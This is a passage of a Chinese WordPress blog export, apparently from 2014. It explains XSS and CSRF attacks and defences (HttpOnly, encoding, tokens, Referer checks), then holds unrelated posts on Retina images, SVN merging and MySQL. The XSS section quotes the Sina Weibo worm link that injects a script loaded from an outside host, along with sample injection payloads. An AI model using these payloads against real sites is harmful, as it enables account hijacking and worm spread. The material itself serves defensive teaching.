<div>由于Cookie中，往往会存储着一些用户安全级别较高的信息，如：用户的登陆凭证。</div>
<div>当用户所访问的网站被注入恶意代码，它只需通过 <em>document.cookie </em>这句简单的JavaScript代码，就可以顺利获取到用户当前访问网站的cookies。</div>
<div>如果攻击者能获取到用户登陆凭证的Cookie，甚至可以绕开登陆流程，直接设置这个cookie的值，来访问用户的账号。</div>
<div></div>
<div>
<h3>构造请求</h3>
<div>
<div>
<div>JavaScript 可以通过多种方式向服务器发送GET与POST请求。</div>
<div>网站的数据访问和操作，基本上都是通过向服务器发送请求而实现的。</div>
<div>如果让恶意代码顺利模拟用户操作，向服务器发送有效请求，将对用户造成重大损失。</div>
<div>例如：更改用户资料、删除用户信息等...</div>
<div></div>
<div>
<h3>XSS钓鱼</h3>
<div>
<div>
<div>关于网站钓鱼，详细大家应该也不陌生了。</div>
<div>
<div>就是伪造一个高度相似的网站，欺骗用户在钓鱼网站上面填写账号密码或者进行交易。</div>
<div>而XSS钓鱼也是利用同样的原理。</div>
<div>注入页面的恶意代码，会弹出一个想死的弹窗，提示用户输入账号密码登陆。</div>
<div>当用户输入后点击发送，这些资料已经去到了攻击者的服务器上了。</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div>如：</div>
<div><a href="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png"><img class="aligncenter size-full wp-image-258" alt="28231056-882bbad839274f95a635ddbd128db3c4" src="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" width="1010" height="553" /></a></div>
<div></div>
<div>
<div>
<div>
<div>
<h3>CSS History Hack</h3>
</div>
<div>CSS History Hack是一个有意思的东西。它结合 浏览器历史记录 和 CSS的伪类：a:visited，通过遍历一个网址列表来获取其中&lt;a&gt;标签的颜色，就能知道用户访问过什么网站。</div>
<div>
<div>
<div>相关链接：</div>
<div>PS：目前最新版的Chrome、Firefox、Safari已经无效，Opera 和 IE8以下 还可以使用。</div>
<div></div>
<div>
<h3>XSS Worm</h3>
<div>
<div>
<div>XSS Worm，即XSS蠕虫，是一种具有自我传播能力的XSS攻击，杀伤力很大。</div>
<div>引发 XSS蠕虫 的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合 反射型XSS 和 存储型XSS 。</div>
<div>案例：Samy Worm、新浪微博XSS攻击</div>
<div></div>
<div>
<h3>新浪微博XSS攻击</h3>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>这张图，其实已经是XSS蠕虫传播阶段的截图了。</div>
<div>攻击者要让XSS蠕虫成功被激活，应该是通过 私信 或者 @微博 的方式，诱惑一些微博大号上当。</div>
<div>当这些大号中有人点击了攻击链接后，XSS蠕虫就被激活，开始传播了。</div>
<div><a href="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png"><img class="aligncenter size-full wp-image-259" alt="28231427-6c93f6962f234f0a8576b1a8979da50e" src="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" width="729" height="185" /></a></div>
<div></div>
<div>
<div>
<div>
<div>这个XSS的漏洞，其实就是没有对地址中的变量进行过滤。</div>
<div>把上一页的链接decode了之后，我们就可以很容易的看出，这个链接的猫腻在哪里。</div>
<div>链接上带的变量，直接输出页面，导致外部JavaScript代码成功注入。</div>
</div>
<div></div>
<div>传播链接：http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</div>
</div>
<div>把链接decode之后：http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;?type=update</div>
<div><a href="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png"><img class="aligncenter  wp-image-260" alt="28231439-beba435e8f8f4a97acdeee43ad981aef (1)" src="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" width="683" height="164" /></a></div>
<div>
<div>相关XSS代码这里就不贴了，Google一下就有。</div>
<div>
<div>其实也要感谢攻击者只是恶作剧了一下，让用户没有造成实际的损失。</div>
<div>网上也有人提到，如果这个漏洞结合XSS钓鱼，再配合隐性传播，那样杀伤力会更大。</div>
</div>
<div></div>
<div></div>
<div>
<hr />
</div>
<div></div>
<div>
<h2>XSS 防御技巧</h2>
</div>
<div>
<div></div>
<h3>HttpOnly</h3>
<div>
<div>
<div>服务器端在设置安全级别高的Cookie时，带上HttpOnly的属性，就能防止JavaScript获取。</div>
<div>PHP设置HttpOnly：</div>
<div>
<pre class="lang:php decode:true ">&lt;?
header("Set-Cookie: a=1;", false);
header("Set-Cookie: b=1;httponly", false);
setcookie("c", "1", NULL, NULL, NULL, NULL, ture);</pre>
&nbsp;
<div>PS：手机上的QQ浏览器4.0，居然不支持httponly，而3.7的版本却没问题。测试平台是安卓4.0版本。</div>
<div>估计是一个低级的bug，已经向QQ浏览器那边反映了情。</div>
<div>截止时间：2013-01-28</div>
&nbsp;
<h3>输入检查</h3>
<div>
<div>
<div><strong>任何用户输入的数据，都是“不可信”的。</strong></div>
<div>
<div>输入检查，一般是用于输入格式检查，例如：邮箱、电话号码、用户名这些...</div>
<div>都要按照规定的格式输入：电话号码必须纯是数字和规定长度；用户名除 中英文数字 外，仅允许输入几个安全的符号。</div>
<div>输入过滤不能完全交由前端负责，前端的输入过滤只是为了避免普通用户的错误输入，减轻服务器的负担。</div>
<div>因为攻击者完全可以绕过正常输入流程，直接利用相关接口向服务器发送设置。</div>
<div>所以，前端和后端要做相同的过滤检查。</div>
<div></div>
<div></div>
</div>
<div>
<h3>输出检查</h3>
<div>
<div>
<div>相比输入检查，前端更适合做输出检查。</div>
<div></div>
<div>
<div>可以看到，HttpOnly和前端没直接关系，输入检查的关键点也不在于前端。</div>
<div>那XSS的防御就和前端没关系了?</div>
<div>当然不是，随着移动端web开发发展起来了，Ajax的使用越来越普遍，越来越多的操作都交给前端来处理。</div>
<div>前端也需要做好XSS防御。</div>
<div>JavaScript直接通过Ajax向服务器请求数据，接口把数据以JSON格式返回。前端整合处理数据后，输出页面。</div>
<div>所以，前端的XSS防御点，在于输出检查。</div>
</div>
<div>但也要结合<strong>XSS可能发生的场景</strong>。</div>
<div></div>
</div>
</div>
</div>
<div>
<h3>XSS注意场景</h3>
</div>
<div>
<div><strong>在HTML标签中输出</strong></div>
<div>如：&lt;a href=# &gt;{$var}&lt;/a&gt;</div>
<div>风险：{$var} 为 &lt;img src=# onerror="/xss/" /&gt;</div>
<div>
<div>防御手段：变量HtmlEncode后输出</div>
<div></div>
</div>
<div><strong>在HTML属性中输出</strong></div>
<div>如：&lt;div data-num="{$var}"&gt;&lt;/div&gt;</div>
<div>风险：{$var} 为 " onclick="/xss/</div>
<div>防御手段：变量HtmlEncode后输出</div>
<div></div>
<div>
<div><strong>在&lt;script&gt;标签中输出</strong></div>
<div>如：&lt;script&gt;var num = {$var};&lt;/script&gt;</div>
<div>风险：{$var} 为 1; alert(/xss/)</div>
<div>
<div>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</div>
<div></div>
</div>
<div><strong>在事件中输出</strong></div>
<div>如：&lt;span onclick="fun({$var})"&gt;hello!click me!&lt;/span&gt;</div>
<div>风险：{$var} 为 ); alert(/xss/); //</div>
<div>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</div>
<div></div>
<div>
<div>
<div><strong>在CSS中输出</strong></div>
<div>一般来说，尽量禁止用户可控制的变量在&lt;style&gt;标签和style属性中输出。</div>
<div></div>
<div><strong>在地址中输出</strong></div>
<div>如：&lt;a href="http://3g.cn/?test={$var}"&gt;</div>
<div>风险：{$var} 为 " onclick="alert(/xss/)</div>
<div>防御手段：对URL中除 协议(Protocal) 和 主机(Host) 外进行URLEncode。如果整个链接都由变量输出，则需要判断是不是http开头。</div>
<div></div>
</div>
</div>
<div>
<h3>HtmlEncode</h3>
<div>
<div>对下列字符实现编码</div>
<div>&amp;     ——》    &amp;amp;</div>
<div>&lt;     ——》    &amp;lt;</div>
<div>&gt;     ——》    &amp;gt;</div>
<div>"    ——》    &amp;quot;</div>
<div>'    ——》    &amp;#39; （IE不支持&amp;apos;）</div>
<div>/      ——》    &amp;#x2F;</div>
<div></div>
<div>
<h3>JavaScriptEncode</h3>
</div>
<div>
<div>
<div>对下列字符加上反斜杠</div>
<div>"    ——》    \"</div>
<div>'    ——》    \'</div>
<div>\      ——》    \\</div>
<div>\n    ——》    \\n</div>
<div>\r     ——》    \\r      (Windows下的换行符)</div>
<div></div>
<div>例子： "\\".replace(/\\/g, "\\\\");  //return \\</div>
<div>推荐一个JavaScript的模板引擎：<a href="http://aui.github.com/artTemplate/%20" target="_blank" rel="noopener noreferrer"><strong>artTemplate</strong></a></div>
<div></div>
<div></div>
<div>
<h3>URLEncode</h3>
<div>
<div>使用以下JS原生方法进行URI编码和解码：</div>
<ul>
	<li>encodeURI</li>
	<li>decodeURI</li>
	<li>decodeURIComponent</li>
	<li>encodeURIComponent</li>
</ul>
<div></div>
<div>
<hr />
</div>
</div>
</div>
<div></div>
<div>
<h2>CSRF（Cross-site request forgery）</h2>
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png"><img class="aligncenter  wp-image-261" alt="28232804-51bdd6fb20674c99a3af90124348859c" src="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" width="548" height="383" /></a></p>
&nbsp;
<div>
<div>
<div>
<div>
<div>
<div>
<div>
<div>CSRF 即：<strong>跨站点请求伪造</strong></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>网站A ：为恶意网站。</div>
<div>网站B ：用户已登录的网站。</div>
<div>当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。</div>
<div></div>
<div>假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&amp;id=81723</div>
<div>A站 直接访问该链接，就能删除用户在 B站 的评论。</div>
<div></div>
</div>
<div>
<div>
<h3>CSRF 的攻击策略</h3>
<div>因为浏览器访问 B站 相关链接时，会向其服务器发送 B站 保存在本地的Cookie，以判断用户是否登陆。所以通过 A站 访问的链接，也能顺利执行。</div>
<div></div>
<div></div>
</div>
</div>
<div>
<hr />
</div>
<div></div>
<div>
<h2>CSRF 防御技巧</h2>
&nbsp;
</div>
<h3>验证码</h3>
<div>
<div>
<div>几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。</div>
<div>验证码算是对抗CSRF攻击最简洁有效的方法。</div>
<div>
<div>但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码。</div>
<div>只有一些关键的操作，才能要求输入验证码。</div>
<div>不过随着HTML5的发展。</div>
<div>利用canvas标签，前端也能识别验证码的字符，让CSRF生效。</div>
</div>
<div></div>
<div>
<h3>Referer Check</h3>
<div>Referer Check即来源检测。</div>
<div>
<div>
<div>HTTP Referer 是 Request Headers 的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer，告诉服务器用户从哪个站点链接过来的。</div>
<div>
<div>服务器通过判断请求头中的referer，也能避免CSRF的攻击。</div>
<div></div>
</div>
<div>
<h3>Token</h3>
<div>
<div>
<div>CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。</div>
<div></div>
<div>
<div>既然知道根本原因，我们就对症下药，利用Token。</div>
<div>当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。</div>
<div>Token可以存放在用户浏览器的Cookie中，</div>
<div>当用户提交表单时带上Token值，服务器就能验证表单和Cookie中的Token是否一致。</div>
<div>（前提，网站没有XSS漏洞，攻击者不能通过脚本获取用户的Cookie）</div>
<div></div>
<div>原文地址：http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>256</wp:post_id>
		<wp:post_date><![CDATA[2014-08-24 14:03:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-24 14:03:34]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%b5%85%e8%b0%88xss%e5%92%8ccsrf]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="csrf"><![CDATA[csrf]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[xss]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>网站如何适配Retina屏幕</title>
		<link>http://wp.veitor.net/2014/08/28/%e7%bd%91%e7%ab%99%e5%a6%82%e4%bd%95%e9%80%82%e9%85%8dretina%e5%b1%8f%e5%b9%95/</link>
		<pubDate>Thu, 28 Aug 2014 00:37:21 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=265</guid>
		<description></description>
		<content:encoded><![CDATA[<h1><b>前言</b></h1>
随着2012年苹果发布第一款Retina Macbook Pro（以下简称RMBP），Retina屏幕开始进入笔记本行业。两年过去了，RMBP的市场占有率越来越高，且获得了一大批设计师朋友的青睐，网站对于Retina屏幕的适配越来越重要。
如果大家对于Retina适配的重要性不是特别清楚，请看我的两个截图：
<a href="http://storage.veitor.net/uploads/2014/08/QQ20140827-1@2x.jpg"><img class="aligncenter size-full wp-image-266" alt="QQ20140827-1@2x" src="http://storage.veitor.net/uploads/2014/08/QQ20140827-1@2x.jpg" width="1406" height="748" /></a>
上图是Google的首页LOGO，我们对比下图SOSO的LOGO：
<a href="http://storage.veitor.net/uploads/2014/08/QQ20140827-2@2x.jpg"><img class="aligncenter size-full wp-image-267" alt="QQ20140827-2@2x" src="http://storage.veitor.net/uploads/2014/08/QQ20140827-2@2x.jpg" width="1382" height="484" /></a>
如果大家还是看不出来，请自行访问这两个网站或者下载附件的截图对比。
那么说完了重要性，适配Retina的原理又是什么呢？我们知道，当一个图像在标准设备下全屏显示时，一位图像素对应的就是一设备像素，导致一个完全保 真的显示，因为一个位置像素不能进一步分裂。而当在Retina屏幕下时，他要放大四倍来保持相同的物理像素的大小，这样就会丢失很多细节，造成失真的情 形。换句话说，每一位图像素被乘以四填补相同的物理表面在视网膜屏幕下显示。（摘自《走向视网膜（Retina）的Web时代》）
那么，解决方法相信大家也都听过，就是通过手动制图或以编程的方式制作两种不同的图形，一张是普通屏幕的图片，另外一种是Retina屏幕的图形，而且Retina屏幕下的图片是普通屏幕的两倍像素。
原理虽然简单，在现实中要实现就不仅仅如此，需综合考虑加载速度，浏览器适配等多方面因素，本文就是教大家如何对Retina的屏幕进行适配。
<h1>正文</h1>
<h3><b>1.直接加载2倍大小的图片。</b></h3>
假如要显示的图片大小为200px*300px，你准备的实际图片大小应该为400px*600px，并且使用以下代码控制即可：
<pre class="lang:xhtml decode:true">&lt;img src="pic.png" height="200px" width="300px" /&gt;</pre>
这种方法就解决了Retina显示不清楚的问题，但是在普通屏幕下，这种图片要经过浏览器的压缩，在IE6和IE7上有十分差得显示效果，同时，两倍大小的图片势必会导致页面加载时间加长，用户体验下降，此时，我们可以通过Retina.js（<a href="http://retinajs.com/">http://retinajs.com/</a>）文件解决：
<pre class="lang:xhtml decode:true">    &lt;img class="pic" src="pic.png" height="200px" width="300px"/&gt;
    &lt;script type="text/javascript"&gt;
    $(document).ready(function () {
    if (window.devicePixelRatio &gt; 1) {
    var images = $("img.pic");
    images.each(function(i) {
    var x1 = $(this).attr('src');
    var x2 = x1.replace(/(.*)(.w+)/, "$1@2x$2");
    $(this).attr('src', x2);
    });
    }
    });
    &lt;/script&gt;</pre>
&nbsp;
<h3>2.Image-set控制</h3>
假如要显示的图片大小为200px*300px，你准备的图片应有两张：一张大小为200px*300px，命名为pic.png；另一张大小为 400px*600px，命名为pic@2x.png（@2x是Retina图标的标准命名方式），然后使用以下css代码控制：
<pre class="lang:xhtml decode:true">    #logo {
    background: url(pic.png) 0 0 no-repeat;
    background-image: -webkit-image-set(url(pic.png) 1x, url(pic@2x.png) 2x);
    background-image: -moz-image-set(url(pic.png) 1x,url(images/pic@2x.png) 2x);
    background-image: -ms-image-set(url(pic.png) 1x,url(images/pic@2x.png) 2x);
    background-image: -o-image-set(url(url(pic.png) 1x,url(images/pic@2x.png) 2x);
    }</pre>
或者使用HTML代码控制亦可：
<pre class="lang:xhtml decode:true">&lt;img src="pic.png" srcset="pic@2x.png 2x" /&gt;</pre>
&nbsp;
<h3>3.使用@media控制</h3>
实际是判断屏幕的像素比来取舍是否显示高分辨率图像，代码如下：
<pre class="lang:xhtml decode:true">    @media only screen and (-webkit-min-device-pixel-ratio: 1.5),
           only screen and (min--moz-device-pixel-ratio: 1.5), /* 注意这里的写法比较特殊 */
           only screen and (-o-min-device-pixel-ratio: 3/2),
           only screen and (min-device-pixel-ratio: 1.5) {
    #logo {
    background-image: url(pic@2x.png);
    background-size: 100px auto;
    }
    }</pre>
使用这个的确定就是IE6、7、8不支持@media，所以无效。但是如果你只是支持苹果的RMBP的话，不存在兼容问题，因为MacOS X上压根没有IE！哈哈哈！
<b>OK，本文到这里就结束了，介绍了上面的三个办法大家可以各有取舍的使用吧~</b>
附件：<a href="http://storage.veitor.net/uploads/2014/08/76757.1946.zip">附件</a>
原文地址：http://www.ui.cn/project.php?id=24556]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>265</wp:post_id>
		<wp:post_date><![CDATA[2014-08-28 00:37:21]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-28 00:37:21]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%bd%91%e7%ab%99%e5%a6%82%e4%bd%95%e9%80%82%e9%85%8dretina%e5%b1%8f%e5%b9%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="post_tag" nicename="retina"><![CDATA[retina]]></category>
		<category domain="post_tag" nicename="%e5%89%8d%e7%ab%af"><![CDATA[前端]]></category>
		<category domain="post_tag" nicename="%e9%80%82%e9%85%8d"><![CDATA[适配]]></category>
						</item>
					<item>
		<title>SVN分支与合并透析</title>
		<link>http://wp.veitor.net/2014/09/05/svn%e5%88%86%e6%94%af%e4%b8%8e%e5%90%88%e5%b9%b6%e9%80%8f%e6%9e%90/</link>
		<pubDate>Fri, 05 Sep 2014 05:30:52 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=273</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1.创建分支的意义</strong>
创 建分支的意义，比如我们在一个基础平台上进行开发，每个技术小组负责一个子项目，而基础平台也是有可能会继续更改的，这个时候，如果不创建分支，子项目之 间会相互影响，影响最大的就是后期的测试和版本发布，子项目A已经结束，但测试却受到正在进行的子项目B的影响，测试通不过，就别说版本发布了。所以，我 们需要从目前的项目（主干trunk）中创建分支（branch），隔离子项目间的相互影响。
<strong>2.svn创建分支原理</strong>
在 svn中，创建分支，实际上就是一个版本拷贝(对应copy to...注意：绝不是简单在客户端上copy一个目录，而是svn仓库中copy，文件版本号会增加。），两边做任何修改发生的版本变化，是一套机制。 举例：目前主干版本是100，分支版本是101，主干中增加一个文件，版本为102，分支中再增加一个文件，版本就为103了。两边的版本号是一套，不会 重复。
<strong>3.svn创建分支的方法</strong>
<strong>TortoiseSVN：</strong>右键点击工程目录-&gt;TortoiseSVN-&gt;Branch/tag..菜单，From WC at Url自动为工程svn url，比如<a href="https://localhost:8443/svn/fbysss/prj1/trunk">https://localhost:8443/svn/fbysss/prj1/trunk</a>，to Url填写<a href="https://localhost:8443/svn/fbysss/prj1">https://localhost:8443/svn/fbysss/prj1/branches/branch1</a>。点OK按钮，分支就创建好了。
<strong>Subclipse：</strong>Team-&gt;Branch/tag..，跟上面类似.
<strong>SVN命令模式：</strong>svn copy trunk_path  branch_path  -m '描述'
举例：svn copy <a href="https://localhost:8443/svn/fbysss/prj1/trunk">https://localhost:8443/svn/fbysss/prj1</a><a href="https://localhost:8443/svn/fbysss/prj1">/trunk </a>
<a href="https://localhost:8443/svn/fbysss/prj1">https://localhost:8443/svn/fbysss/prj1/branches/branch1</a> -m "第一个分支"
<strong>注意一点：</strong>trunk和branch不能互为子目录，否则就乱套了。
<strong>4.分支合并</strong>
<strong>1）从分支合并到主干</strong>
分支开发结束之后，往往需要合并回主干去测试、发布，但分支和主干可能有很多冲突的地方，在合并时经常需要手工解决。
<strong>被操作对象：</strong>主干
<strong>From</strong><strong>：</strong>主干的打出分支时的版本
<strong>To：</strong>分支的Head版本（最新版本）
&nbsp;
怎么理解这个From和To呢?似乎跟我们的想当然不太一样：因为我们理解，把分支合并到主干，肯定是From分支，To主干。怎么搞反了呢？
实际上，<strong>Svn</strong><strong>认为，我们要合并的，是从主干的某个版本开始，到分支的某个版本结束。两边的版本号实际上是一套系统，不会有重复。</strong>我们从TortoiseSVN Help中也能找到证据：
<pre class="lang:php decode:true ">If you are using this method to merge a feature branch back to trunk, you need to ........
In the From: field enter the full folder URL of the trunk. This may sound wrong, but remember that the trunk is the start point to which you want to add the branch changes. You may also click ... to browse the repository.
In the To: field enter the full folder URL of the feature branch.</pre>
&nbsp;
<strong>2）从主干合并到分支</strong>
试想这样的情况：一个项目里面，要独立出来一个子项目，需要单独发布版本，用到了基础框架代码，而基础框架在主干中不断修改完善，这就需要从主干合并到分支。
<strong>被操作对象：</strong>分支
<strong>From：</strong>分支的第一个版本（最旧版本）
<strong>To：</strong>主干的Head版本（最新版本）
相当于从分支的第一个版本开始一直到主干最后一个版本结束合并之后，替换分支。
<strong>3）从分支合并到分支</strong>
有 这样的需求：一个项目中有很多分支，这些分支需要分期上线，有多个工作并行，但每一期之间不能相互影响，这就可以打出几个tag（也是分支），从主干 copy而来。其他主干根据排期分别合并到这些tag中来。比如有prjTag1和prjTag2，model1、model2需要合并到prjTag1 中，model3、model4需要合并到prjTag2中。拿prjTag1举例：
在prjTag1的work copy中，merge
&nbsp;
<strong>From</strong><strong>：</strong>主干的打出分支时的版本
<strong>To：</strong>分支的Head版本（最新版本）
<strong>注意：</strong>From不是本Tag的某个版本，而是之前主干打出分支时的版本，最终Merge到prjTag1的work copy，而prjTag1是找不到当初打分支时的版本的。
原文地址：http://blog.csdn.net/fbysss/article/details/5437157]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>273</wp:post_id>
		<wp:post_date><![CDATA[2014-09-05 05:30:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-09-05 05:30:52]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[svn%e5%88%86%e6%94%af%e4%b8%8e%e5%90%88%e5%b9%b6%e9%80%8f%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="svn"><![CDATA[SVN]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>Mysql中使用Insert批量更新数据</title>
		<link>http://wp.veitor.net/2014/09/09/mysql%e4%b8%ad%e4%bd%bf%e7%94%a8insert%e6%89%b9%e9%87%8f%e6%9b%b4%e6%96%b0%e6%95%b0%e6%8d%ae/</link>
		<pubDate>Tue, 09 Sep 2014 09:00:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=275</guid>
		<description></description>
		<content:encoded><![CDATA[我们知道当插入多条数据的时候insert支持多条语句：
<pre class="lang:php decode:true">INSERT INTO t_member (id, name, email) VALUES
    (1, 'nick', 'nick@126.com'),
    (4, 'angel','angel@163.com'),
    (7, 'brank','ba198@126.com');</pre>
&nbsp;
但是对于更新记录，由于update语法不支持一次更新多条记录，只能一条一条执行：
<pre class="lang:php decode:true">UPDATE t_member SET name='nick', email='nick@126.com' WHERE id=1;
UPDATE t_member SET name='angel', email='angel@163.com' WHERE id=4;
UPDATE t_member SET name='brank', email='ba198@126.com' WHERE id=7;</pre>
这里问题就出现了，倘若这个update list非常大时(譬如说5000条)，这个执行率可想而知。
这就要介绍一下在MySql中INSERT语法具有一个条件DUPLICATE KEY UPDATE，这个语法和适合用在需要判断记录是否存在，不存在则插入存在则更新的记录。
具体的语法可以参见：<a href="http://dev.mysql.com/doc/refman/5.0/en/insert.html" target="_blank" rel="noopener noreferrer">http://dev.mysql.com/doc/refman/5.0/en/insert.html</a>
基于上面这种情况，针对更新记录，仍然使用insert语句，不过限制主键重复时，更新字段。如下：
<pre class="lang:php decode:true">INSERT INTO t_member (id, name, email) VALUES
    (1, 'nick', 'nick@126.com'),
    (4, 'angel','angel@163.com'),
    (7, 'brank','ba198@126.com')
ON DUPLICATE KEY UPDATE name=VALUES(name), email=VALUES(email);</pre>
<span style="color: #ff0000;">注意：ON DUPLICATE KEY UPDATE只是MySQL的特有语法，并不是SQL标准语法！</span>
原文地址：http://www.crackedzone.com/mysql-muti-sql-not-sugguest-update.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>275</wp:post_id>
		<wp:post_date><![CDATA[2014-09-09 09:00:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-09-09 09:00:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mysql%e4%b8%ad%e4%bd%bf%e7%94%a8insert%e6%89%b9%e9%87%8f%e6%9b%b4%e6%96%b0%e6%95%b0%e6%8d%ae]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>Mysql事务以及隔离级别</title>
		<link>http://wp.veitor.net/2014/09/22/mysql%e4%ba%8b%e5%8a%a1%e4%bb%a5%e5%8f%8a%e9%9a%94%e7%a6%bb%e7%ba%a7%e5%88%ab/</link>
		<pubDate>Mon, 22 Sep 2014 14:20:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=319</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>数据库事务概念</h1>
数据库事务必须同时满足 4 个特性：原子性（Atomic）、一致性（Consistency）、隔离性（Isolation）和持久性（Durabiliy），简称为ACID。下面是对每个特性的说明。
<ul>
	<li>原子性：表示组成一个事务的多个数据库操作要么全部成功、要么全部失败。</li>
	<li>一致性：事务操作成功后，数据库所处的状态和它的业务规则是一致的，即数据不会被破坏。如从A账户转账100元到B账户，不管操作成功与否，A和B的存款总额是不变的。</li>
	<li>隔离性：在并发数据操作时，不同的事务拥有各自的数据空间，它们的操作不会对对方产生干扰。准确地说，并非要求做到完全无干扰，数据库规定了多种事务隔离级别，不同隔离级别对应不同的干扰程度，隔离级别越高，数据一致性越好，但并发性越弱。</li>
	<li>持久性：一旦事务提交成功后，事务中所有的数据操作都必须被持久化到数据库中，即使提交事务后，数据库马上崩溃，在数据库重启时，也必须能保证能够通过某种机制恢复数据。</li>
</ul>
其实这四个特性，原子性是最终目的。
&nbsp;
<h1>数据并发的问题</h1>
一个数据库可能拥有多个访问客户端，这些客户端都可以并发方式访问数据库。数据库中的相同数据可能同时被多个事务访问，如果没有采取必要的隔离措施，就会导致各种并发问题，破坏数据的完整性。这些问题可以归结为5类，包括3类数据读问题（ 脏读、 不可重复读和 幻象读）以及2类数据更新问题（ 第一类丢失更新和 第二类丢失更新）。下面，我们分别通过实例讲解引发问题的场景。
